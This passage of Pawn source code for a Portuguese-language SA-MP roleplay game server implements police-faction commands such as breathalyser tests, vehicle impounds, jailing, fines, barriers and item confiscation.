		{
 			SendClientMessage(playerid, COLOR_CHAT, "_______________________________[ BASE DE DADOS DA PSP ]_______________________________");
 			format(string, sizeof(string), "Matrícula: {FFFFFF}%s", cInfo[c][Matricula]);
 			SendClientMessage(playerid, COLOR_CHAT, string);
   			format(string, sizeof(string), "Proprietário: {FFFFFF}%s", cInfo[c][Prop]);
 			SendClientMessage(playerid, COLOR_CHAT, string);
   			format(string, sizeof(string), "Dia de compra: {FFFFFF}%s", cInfo[c][CompradoEm]);
 			SendClientMessage(playerid, COLOR_CHAT, string);
 			SendClientMessage(playerid, COLOR_CHAT, "_______________________________________________________________________________________");

			found = true;
			break;
		}
		
		if(c == 5) break;
    }
    
    if(found == false)
    {
        SendClientMessage(playerid, COLOR_INFO, "Essa matrícula não foi encontrada na Base de Dados da PSP.");
    }

    PlayerActionMessage(playerid, 15.0, "procura uma matrícula no seu PDA.");

    return 1;
}

COMMAND:testebalao(playerid, params[], help)
{
	if(fInfo[pInfo[playerid][Faction]][Type] != F_POLICIA) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");
	if(FactionDuty[playerid] == false && fInfo[pInfo[playerid][Faction]][UseDuty] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em duty");

    new giveplayerid, string[128];

    if(sscanf(params, "d", giveplayerid)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/testebalao <playerid>");
    if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
	if(!ProxDetectorS(8.0, playerid, giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás perto do jogador");
	
	new taxa[8], contra[16];
	
	switch(DrunkLevel[giveplayerid])
	{
	    case 0:
	    {
	        taxa = "0.0";
			contra = "Nenhuma";
	    }
	    case 1,2:
	    {
	        taxa = "0.2";
			contra = "Nenhuma";
	    }
		case 3,4:
		{
		    taxa = "0.6";
		    contra = "Grave";
		}
		case 5:
		{
		    taxa = "0.9";
		    contra = "Muito Grave";
		}
		case 6:
		{
		    taxa = "1.1";
		    contra = "Muito Grave";
		}
		default:
		{
		    taxa = "1.5";
		    contra = "Crime";
		}
	}
	
	PlayerActionMessage(giveplayerid, 15.0, "sopra no balão.");
	
	format(string, sizeof(string), "%s: {FFFFFF}[{99FF00}Taxa de álcool no sangue: {FFFFFF}%s g/L | {99FF00}Contra Ordenação: {FFFFFF}%s", GetPlayerNameEx(giveplayerid), taxa, contra);
	SendClientMessage(playerid, COLOR_ORANGE, string);

    return 1;
}

COMMAND:desapreendercarro(playerid, params[], help)
{
	if(fInfo[pInfo[playerid][Faction]][Type] != F_POLICIA) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");
	if(FactionDuty[playerid] == false && fInfo[pInfo[playerid][Faction]][UseDuty] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em duty");

	if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOCAR);
	if(IsInGaragemPSP(playerid) == 0) return SendClientMessage(playerid, COLOR_ERRO, "Precisas de estar na Garagem dos Apreendidos da PSP");

    new car = GetPlayerVehicleID(playerid);

	cInfo[car][Apreendido] = 0;

	GuardarCarro(car);

	SendClientMessage(playerid, COLOR_INFO, "Carro desapreendido");

    return 1;
}

COMMAND:apreendercarro(playerid, params[], help)
{
	if(fInfo[pInfo[playerid][Faction]][Type] != F_POLICIA) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");
	if(FactionDuty[playerid] == false && fInfo[pInfo[playerid][Faction]][UseDuty] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em duty");

	if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOCAR);
	if(IsInGaragemPSP(playerid) == 0) return SendClientMessage(playerid, COLOR_ERRO, "Precisas de estar na Garagem dos Apreendidos da PSP");
	
    new car = GetPlayerVehicleID(playerid);
    new Float:cx, Float:cy, Float:cz, Float:angle, Float:hp;

	GetVehicleHealth(car, hp);
    GetVehiclePos(car, cx,cy,cz);
    GetVehicleZAngle(car, angle);

	cInfo[car][X] = cx;
	cInfo[car][Y] = cy;
	cInfo[car][Z] = cz;
	cInfo[car][Angle] = angle;
	cInfo[car][Apreendido] = 1;
	cInfo[car][mod1] = -1;
	cInfo[car][mod2] = 0;
	cInfo[car][mod3] = 0;
	cInfo[car][mod4] = 0;
	cInfo[car][mod5] = 0;
	cInfo[car][mod6] = 0;
	cInfo[car][mod7] = 0;
	cInfo[car][mod8] = 0;
	cInfo[car][mod9] = 0;
	cInfo[car][mod10] = 0;
	cInfo[car][mod11] = 0;
	
	ChangeVehiclePaintjob(car, 3);
	RemoveVehicleComponent(car, cInfo[car][mod1]);
	RemoveVehicleComponent(car, cInfo[car][mod2]);
	RemoveVehicleComponent(car, cInfo[car][mod3]);
	RemoveVehicleComponent(car, cInfo[car][mod4]);
	RemoveVehicleComponent(car, cInfo[car][mod5]);
	RemoveVehicleComponent(car, cInfo[car][mod6]);
	RemoveVehicleComponent(car, cInfo[car][mod7]);
	RemoveVehicleComponent(car, cInfo[car][mod8]);
	RemoveVehicleComponent(car, cInfo[car][mod9]);
	RemoveVehicleComponent(car, cInfo[car][mod10]);
	RemoveVehicleComponent(car, cInfo[car][mod11]);

	GuardarCarro(car);

    IsARespawn[car] = true;
	DestroyVehicle(cInfo[car][ID]);
	cInfo[car][ID] = CreateVehicle(cInfo[car][Model], cInfo[car][X], cInfo[car][Y], cInfo[car][Z], cInfo[car][Angle], cInfo[car][Color1], cInfo[car][Color2], -1, IsACopCar(cInfo[car][Model]) ? 1 : 0);
	SetVehicleVirtualWorld(cInfo[car][ID], cInfo[car][VirtualWorld]);
	LinkVehicleToInterior(cInfo[car][ID], cInfo[car][Interior]);
	AtualizarDanosCarro(car);
	SetVehicleHealth(car, hp);
	PutPlayerInVehicle(playerid, cInfo[car][ID], 0);
	
	SendClientMessage(playerid, COLOR_INFO, "Carro apreendido");

    return 1;
}

COMMAND:sirene(playerid, params[], help)
{
	if(fInfo[pInfo[playerid][Faction]][Type] != F_POLICIA && AdminDuty[playerid] == false) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");
	if(FactionDuty[playerid] == false && fInfo[pInfo[playerid][Faction]][UseDuty] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em duty");

    new type;

    if(sscanf(params, "d", type)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/sirene <1: Dentro | 2: Tejadilho>");
    if(type <= 0 || type > 2) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Type inválido");
	if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOCAR);
	
	new car = GetPlayerVehicleID(playerid);

	if(Sirene[car] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Esse veículo já tem sirene");

	switch(type)
	{
	    case 1:
	    {
     		Sirene_O[car] = CreateObject(18646, 10.0, 10.0, 10.0, 0, 0, 0);
       		AttachObjectToVehicle(Sirene_O[car], car, 0.0, 0.75, 0.275, 0.0, 0.1, 0.0);
	    }
	    case 2:
		{
  			Sirene_O[car] = CreateObject(18646, 10.0, 10.0, 10.0, 0, 0, 0);
     		AttachObjectToVehicle(Sirene_O[car], car, -0.43, 0.0, 0.785, 0.0, 0.1, 0.0);
		}
	}
	
	SendClientMessage(playerid, COLOR_INFO, "Colocaste uma sirene no veículo (/desligarsirene)");

	Sirene[car] = 1;

    return 1;
}

COMMAND:desligarsirene(playerid, params[], help)
{
    if(fInfo[pInfo[playerid][Faction]][Type] != F_POLICIA && AdminDuty[playerid] == false) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");
    
    new car = GetPlayerVehicleID(playerid);
    
    if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOCAR);
    if(Sirene[car] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Esse veículo não tem sirene");
    
    DestroyObject(Sirene_O[car]);
    Sirene[car] = 0;
    
    SendClientMessage(playerid, COLOR_INFO, "Desligaste a sirene do veículo");

	return 1;
}

COMMAND:garagemsr(playerid, params[], help)
{
	if(fInfo[pInfo[playerid][Faction]][Type] != F_SR && AdminDuty[playerid] == false) return 1;

	if(IsPlayerInRangeOfPoint(playerid, 7, 326.7993, -1479.5522, 24.7739))
	{
		if(srgaragem1_1_b == false && srgaragem1_2_b == false)
  		{
			PlayerActionMessage(playerid, 15.0, "clica no comando e abre a porta.");
			
    		MoveDynamicObject(srgaragem1_1, 327.46304, -1479.92493, 22.55216, 2.00);
    		MoveDynamicObject(srgaragem1_2, 327.46304, -1479.92493, 22.55216, 2.00);
    		
			srgaragem1_1_b = true;
			srgaragem1_2_b = true;
		}
		else
		{
			PlayerActionMessage(playerid, 15.0, "clica no comando e fecha a porta.");
			
    		MoveDynamicObject(srgaragem1_1, 327.46304, -1479.92493, 29.11834, 2.00);
    		MoveDynamicObject(srgaragem1_2, 327.46304, -1479.92493, 25.71881, 2.00);
			
			srgaragem1_1_b = false;
			srgaragem1_2_b = false;
		}
	}
	else if(IsPlayerInRangeOfPoint(playerid, 7, 280.3257, -1548.5282, 24.6491))
	{
		if(srgaragem2_1_b == false && srgaragem2_2_b == false)
  		{
			PlayerActionMessage(playerid, 15.0, "clica no comando e abre a porta.");

    		MoveDynamicObject(srgaragem2_1, 280.22620, -1548.16333, 22.32809, 2.00);
    		MoveDynamicObject(srgaragem2_2, 280.20914, -1548.15283, 22.32809, 2.00);

			srgaragem2_1_b = true;
			srgaragem2_2_b = true;
		}
		else
		{
			PlayerActionMessage(playerid, 15.0, "clica no comando e fecha a porta.");

    		MoveDynamicObject(srgaragem2_1, 280.22620, -1548.16333, 29.65302, 2.00);
    		MoveDynamicObject(srgaragem2_2, 280.20914, -1548.15283, 26.24194, 2.00);

			srgaragem2_1_b = false;
			srgaragem2_2_b = false;
		}
	}

	return 1;
}

COMMAND:garagempsp(playerid, params[], help)
{
	if(fInfo[pInfo[playerid][Faction]][Type] != F_POLICIA && AdminDuty[playerid] == false) return 1;

	if(IsPlayerInRangeOfPoint(playerid, 6, 1588.3940, -1637.9794, 12.4088))
	{
		if(pspgaragem1_b == false && pspgaragem2_b == false)
  		{
			PlayerActionMessage(playerid, 15.0, "clica no comando e abre a porta.");
			
			MoveDynamicObject(pspgaragem1, 1590.41174, -1638.20911, 10.46357, 2.00);
			MoveDynamicObject(pspgaragem2, 1585.94800, -1638.11829, 10.54216, 2.00);
    		
			pspgaragem1_b = true;
			pspgaragem2_b = true;
		}
		else
		{
			PlayerActionMessage(playerid, 15.0, "clica no comando e fecha a porta.");
			
			MoveDynamicObject(pspgaragem1, 1590.41174, -1638.20911, 13.91207, 2.00);
			MoveDynamicObject(pspgaragem2, 1585.94800, -1638.11829, 13.84867, 2.00);

			pspgaragem1_b = false;
			pspgaragem2_b = false;
		}
	}

	return 1;
}

COMMAND:portapsp(playerid, params[], help)
{
	if(fInfo[pInfo[playerid][Faction]][Type] != F_POLICIA && AdminDuty[playerid] == false) return 1;

	if(IsPlayerInRangeOfPoint(playerid, 4, 1560.11401, -1683.49597, 1100.06995))
	{
		if(pspentrada1_b == false)
  		{
			PlayerActionMessage(playerid, 15.0, "introduz o código e abre a porta.");
    		MoveDynamicObject(pspentrada1, 1558.60876, -1683.49597, 1100.06995, 2.00);
			pspentrada1_b = true;
		}
		else
		{
			PlayerActionMessage(playerid, 15.0, "introduz o código e fecha a porta.");
			MoveDynamicObject(pspentrada1, 1560.11401, -1683.49597, 1100.06995, 2.00);
			pspentrada1_b = false;
		}
	}
	else if(IsPlayerInRangeOfPoint(playerid, 4, 1561.62024, -1667.60498, 1100.06995))
	{
		if(pspentrada2_b == false)
		{
			PlayerActionMessage(playerid, 15.0, "introduz o código e abre a porta.");
			MoveDynamicObject(pspentrada2, 1563.14172, -1667.60498, 1100.06995, 2.00);
			pspentrada2_b = true;
		}
		else
		{
	  		PlayerActionMessage(playerid, 15.0, "introduz o código e fecha a porta.");
	  		MoveDynamicObject(pspentrada2, 1561.62024, -1667.60498, 1100.06995, 2.00);
	  		pspentrada2_b = false;
		}
	}
	
	return 1;
}

COMMAND:prender(playerid, params[], help)
{
	if(fInfo[pInfo[playerid][Faction]][Type] != F_POLICIA) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");
	if(FactionDuty[playerid] == false && fInfo[pInfo[playerid][Faction]][UseDuty] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em duty");

    new giveplayerid, time, reason[32], string[128];

    if(sscanf(params, "dds[32]", giveplayerid, time, reason)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/prender <playerid> <minutos> <razão>");
    if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
    if(!ProxDetectorS(8.0, playerid, giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás perto do jogador");
    if(playerid == giveplayerid) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não te podes prender a ti próprio");
    if(!IsPlayerInRangeOfPoint(playerid, 7.0, oInfo[0][PrenderX], oInfo[0][PrenderY], oInfo[0][PrenderZ])) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás na zona de prender");

	if(time != 0)
	{
    	format(string, sizeof(string), "Prendeste o jogador %s por %d minutos. Razão: %s.", GetPlayerNameEx(giveplayerid), time, reason);
    	SendClientMessage(playerid, COLOR_CHAT, string);
    	format(string, sizeof(string), "O jogador %s prendeu-te por %d minutos. Razão: %s.", GetPlayerNameEx(playerid), time, reason);
    	SendClientMessage(giveplayerid, COLOR_CHAT, string);

		pInfo[giveplayerid][Preso] = 1;
		pInfo[giveplayerid][PresoTempo] = time*60;
		ResetPlayerWeapons(giveplayerid);

		SetPlayerInterior(giveplayerid, 0);
		SetPlayerVirtualWorld(giveplayerid,0);
		SetPlayerPosEx(giveplayerid, 1583.6875, -1680.5103, 1089.5883);
	}
	else
	{
    	format(string, sizeof(string), "Tiraste o jogador %s da prisão. Razão: %s.", GetPlayerNameEx(giveplayerid), reason);
    	SendClientMessage(playerid, COLOR_CHAT, string);
    	format(string, sizeof(string), "O jogador %s tirou-te da prisão. Razão: %s.", GetPlayerNameEx(playerid), reason);
    	SendClientMessage(giveplayerid, COLOR_CHAT, string);

		pInfo[giveplayerid][Preso] = 0;
		pInfo[giveplayerid][PresoTempo] = 0;

		SpawnarJogador(giveplayerid);
	}

    return 1;
}

COMMAND:colocarbarreira(playerid, params[], help)
{
	if(fInfo[pInfo[playerid][Faction]][Type] != F_POLICIA) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");
	if(FactionDuty[playerid] == false && fInfo[pInfo[playerid][Faction]][UseDuty] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em duty");

	new barreira, string[128];

	if(sscanf(params, "d", barreira))
	{
	    SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/colocarbarreira <id>");
		SendClientMessage(playerid, COLOR_CHAT, "[BARREIRAS:] {FFFFFF}1: Barreira Pequena - 2: Cones - 3: Placa de Aviso - 4: Bloqueio");

		return 1;
	}

	if(barreira <= 0 || barreira > 4) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Barreira inválida");
	if(BarreirasCounter > (MAX_BARREIRAS-1)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Barreiras méximas atingidas");
	
	new Float:x, Float:y, Float:z, Float:a;
	
	GetPlayerPos(playerid, x, y, z);
	GetPlayerFacingAngle(playerid, a);
	
	switch(barreira)
	{
	    case 1:
	    {
            Barreiras[BarreirasCounter] = CreateDynamicObject(1459, x, y, z-0.7, 0, 0, a, -1, -1, -1, 200.0, 0.0);
            format(string, sizeof(string), "Colocaste a barreira %d (Barreira Pequena)", BarreirasCounter);
	    }
	    case 2:
	    {
            Barreiras[BarreirasCounter] = CreateDynamicObject(1238, x, y, z-0.7, 0, 0, a, -1, -1, -1, 200.0, 0.0);
            format(string, sizeof(string), "Colocaste a barreira %d (Cone)", BarreirasCounter);
	    }
	    case 3:
	    {
            Barreiras[BarreirasCounter] = CreateDynamicObject(3265, x, y, z-0.7, 0, 0, a, -1, -1, -1, 200.0, 0.0);
            format(string, sizeof(string), "Colocaste a barreira %d (Placa de Aviso)", BarreirasCounter);
	    }
	    case 4:
	    {
            Barreiras[BarreirasCounter] = CreateDynamicObject(3091, x, y, z-0.7, 0, 0, a, -1, -1, -1, 200.0, 0.0);
            format(string, sizeof(string), "Colocaste a barreira %d (Bloqueio)", BarreirasCounter);
	    }
	}
	
	SendClientMessage(playerid, COLOR_INFO, string);
	
 	GameTextForPlayer(playerid, "~w~Barreira ~b~Montada!", 1000, 1);
  	PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
  	
	BarreirasCounter++;

	return 1;
}

COMMAND:retirarbarreira(playerid, params[], help)
{
	if(fInfo[pInfo[playerid][Faction]][Type] != F_POLICIA) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");
	if(FactionDuty[playerid] == false && fInfo[pInfo[playerid][Faction]][UseDuty] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em duty");

	new barreira, string[128];

	if(sscanf(params, "d", barreira)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/retirarbarreira <id>");

    if(BarreirasCounter == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Nenhuma barreira está a ser usada");
	if(Barreiras[barreira] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Essa barreira não está a ser usada");

    DestroyDynamicObject(Barreiras[barreira]);
    BarreirasCounter--;

	format(string, sizeof(string), "Retiraste a barreira %d", barreira);
	SendClientMessage(playerid, COLOR_INFO, string);
	
 	GameTextForPlayer(playerid, "~w~Barreira ~r~Desmontada!", 1000, 1);
  	PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);

	return 1;
}

COMMAND:retirartodasbarreiras(playerid, params[], help)
{
	if(fInfo[pInfo[playerid][Faction]][Type] != F_POLICIA) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");
	if(FactionDuty[playerid] == false && fInfo[pInfo[playerid][Faction]][UseDuty] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em duty");

    for(new i = 1; i < MAX_BARREIRAS; i++)
    {
        DestroyDynamicObject(Barreiras[i]);
        Barreiras[i] = 0;
    }

    BarreirasCounter = 0;
    
	SendClientMessage(playerid, COLOR_INFO, "Retiraste todas as barreiras");
	
	return 1;
}

COMMAND:puxar(playerid, params[], help)
{
	if(fInfo[pInfo[playerid][Faction]][Type] != F_POLICIA) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");
	if(FactionDuty[playerid] == false && fInfo[pInfo[playerid][Faction]][UseDuty] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em duty");

	new giveplayerid, string[128];

	if(sscanf(params, "d", giveplayerid)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/puxar <playerid>");

	if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
	if(!ProxDetectorS(8.0, playerid, giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás perto do jogador");
	if(playerid == giveplayerid) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não te podes puxar a ti próprio");
	if(Algemado[giveplayerid] == false) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Esse jogador não está algemado");

	format(string, sizeof(string), "Puxaste o jogador %s para dentro do teu carro", GetPlayerNameEx(giveplayerid));
	SendClientMessage(playerid, COLOR_INFO, string);
	format(string, sizeof(string), "O jogador %s puxou-te para dentro do seu carro.", GetPlayerNameEx(playerid));
	SendClientMessage(giveplayerid, COLOR_INFO, string);
	
	PutPlayerInVehicle(giveplayerid, GetPlayerVehicleID(playerid), 1);
	
	PlayerPlayerActionMessage(playerid, giveplayerid, 15.0, "puxa para dentro do carro");

	return 1;
}

COMMAND:multar(playerid, params[], help)
{
	if(fInfo[pInfo[playerid][Faction]][Type] != F_POLICIA) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");
	if(FactionDuty[playerid] == false && fInfo[pInfo[playerid][Faction]][UseDuty] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em duty");

	new giveplayerid, reason[32], custo, string[128];

	if(sscanf(params, "dds[32]", giveplayerid, custo, reason)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/multar <playerid> <custo> <razão>");

	if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
	if(!ProxDetectorS(8.0, playerid, giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás perto do jogador");
	if(playerid == giveplayerid) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não te podes multar a ti próprio");
	if(Multado[giveplayerid] == true) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Esse jogador já foi multado");
	if(custo <= 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Custo inválido");

	Multado[giveplayerid] = true;
	CustoMulta[giveplayerid] = custo;
	MultadorID[giveplayerid] = playerid;
	pInfo[giveplayerid][Multas]++;

	format(string, sizeof(string), "Multaste o jogador %s. Razão: %s. Valor: %d$", GetPlayerNameEx(giveplayerid), reason, custo);
	SendClientMessage(playerid, COLOR_INFO, string);
	format(string, sizeof(string), "O jogador %s multou-te. Razão: %s. Valor: %d$ (/pagarmulta).", GetPlayerNameEx(playerid), reason, custo);
	SendClientMessage(giveplayerid, COLOR_INFO, string);

	return 1;
}

COMMAND:apreender(playerid, params[], help)
{
	if(fInfo[pInfo[playerid][Faction]][Type] != F_POLICIA) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");
	if(FactionDuty[playerid] == false && fInfo[pInfo[playerid][Faction]][UseDuty] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em duty");

	new giveplayerid, item[16], string[128];

	if(sscanf(params, "ds[16]", giveplayerid, item))
	{
 		SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/apreender <playerid> <item>");
 		SendClientMessage(playerid, COLOR_CHAT, "[Items]: {FFFFFF}cartaligeiros, cartamotociclos, cartapesados, licençaarmas, drogas, materiais, armas");
 		
 		return 1;
	}
	if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
	if(playerid == giveplayerid) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não podes fazer isso a ti próprio");
	if(!ProxDetectorS(8.0, playerid, giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás perto do jogador");
	
	if(strcmp(item, "cartaligeiros", true) == 0)
	{
	    if(pInfo[giveplayerid][CartaLig] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Esse jogador não tem carta de Ligeiros");
	    
	    pInfo[giveplayerid][CartaLig] = 0;
	    
	    format(string, sizeof(string), "Apreendeste a carta de Ligeiros ao jogador %s", GetPlayerNameEx(giveplayerid));
	    SendClientMessage(playerid, COLOR_INFO, string);
	    format(string, sizeof(string), "O jogador %s apreendeu a tua carta de Ligeiros.", GetPlayerNameEx(playerid));
	    SendClientMessage(giveplayerid, COLOR_INFO, string);
	}
	else if(strcmp(item, "cartamotociclos", true) == 0)
	{
	    if(pInfo[giveplayerid][CartaMota] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Esse jogador não tem carta de Motociclos");

	    pInfo[giveplayerid][CartaMota] = 0;

	    format(string, sizeof(string), "Apreendeste a carta de Motociclos ao jogador %s", GetPlayerNameEx(giveplayerid));
	    SendClientMessage(playerid, COLOR_INFO, string);
	    format(string, sizeof(string), "O jogador %s apreendeu a tua carta de Motociclos.", GetPlayerNameEx(playerid));
	    SendClientMessage(giveplayerid, COLOR_INFO, string);
	}
	else if(strcmp(item, "cartapesados", true) == 0)
	{
	    if(pInfo[giveplayerid][CartaPesados] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Esse jogador não tem carta de Pesados");

	    pInfo[giveplayerid][CartaPesados] = 0;

	    format(string, sizeof(string), "Apreendeste a carta de Pesados ao jogador %s", GetPlayerNameEx(giveplayerid));
	    SendClientMessage(playerid, COLOR_INFO, string);
	    format(string, sizeof(string), "O jogador %s apreendeu a tua carta de Pesados.", GetPlayerNameEx(playerid));
	    SendClientMessage(giveplayerid, COLOR_INFO, string);
	}
	else if(strcmp(item, "licençaarmas", true) == 0)
	{
	    if(pInfo[giveplayerid][LicArmas] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Esse jogador não tem Licença de Armas");

	    pInfo[giveplayerid][LicArmas] = 0;

	    format(string, sizeof(string), "Apreendeste a Licença de Armas ao jogador %s", GetPlayerNameEx(giveplayerid));
	    SendClientMessage(playerid, COLOR_INFO, string);
	    format(string, sizeof(string), "O jogador %s apreendeu a tua Licença de Armas.", GetPlayerNameEx(playerid));
	    SendClientMessage(giveplayerid, COLOR_INFO, string);
	}
	else if(strcmp(item, "drogas", true) == 0)
	{
	    if(pInfo[giveplayerid][Drogas] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Esse jogador não tem Drogas");

	    pInfo[giveplayerid][Drogas] = 0;

	    format(string, sizeof(string), "Apreendeste as Drogas ao jogador %s", GetPlayerNameEx(giveplayerid));
	    SendClientMessage(playerid, COLOR_INFO, string);
	    format(string, sizeof(string), "O jogador %s apreendeu as tuas Drogas.", GetPlayerNameEx(playerid));
	    SendClientMessage(giveplayerid, COLOR_INFO, string);
	}
	else if(strcmp(item, "materiais", true) == 0)
	{
	    if(pInfo[giveplayerid][Materiais] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Esse jogador não tem Materiais");

	    pInfo[giveplayerid][Materiais] = 0;

	    format(string, sizeof(string), "Apreendeste os Materiais ao jogador %s", GetPlayerNameEx(giveplayerid));
	    SendClientMessage(playerid, COLOR_INFO, string);
	    format(string, sizeof(string), "O jogador %s apreendeu os teus Materiais.", GetPlayerNameEx(playerid));
	    SendClientMessage(giveplayerid, COLOR_INFO, string);
	}
	else if(strcmp(item, "armas", true) == 0)
	{
		new Player_Weapons[13];
		new Player_Ammos[13];
		new i, counter;

		for(i = 1;i <= 12;i++)
		{
			GetPlayerWeaponData(giveplayerid, i, Player_Weapons[i], Player_Ammos[i]);
			if(Player_Weapons[i] != 0)
			{
				new weaponName[128];

				GetWeaponName(Player_Weapons[i], weaponName,255);

				format(string, 255, "Arma Encontrada: %s.", weaponName);

				SendClientMessage(playerid, COLOR_INFO, string);

				counter++;
			}
		}
		
	    if(counter == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Esse jogador não tem Armas");

	    ResetPlayerWeapons(giveplayerid);

	    format(string, sizeof(string), "Apreendeste as armas ao jogador %s", GetPlayerNameEx(giveplayerid));
	    SendClientMessage(playerid, COLOR_INFO, string);
	    format(string, sizeof(string), "O jogador %s apreendeu as tuas Armas", GetPlayerNameEx(playerid));
	    SendClientMessage(giveplayerid, COLOR_INFO, string);
	}

	return 1;
}

COMMAND:revistar(playerid, params[], help)
{
	if(fInfo[pInfo[playerid][Faction]][Type] != F_POLICIA) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");
	if(FactionDuty[playerid] == false && fInfo[pInfo[playerid][Faction]][UseDuty] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em duty");

	new giveplayerid, string[128];

	if(sscanf(params, "d", giveplayerid)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/revistar <playerid>");
	if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
	if(FactionDuty[playerid] == false && fInfo[pInfo[playerid][Faction]][UseDuty] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em duty");
	if(playerid == giveplayerid) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não te podes revistar a ti próprio");
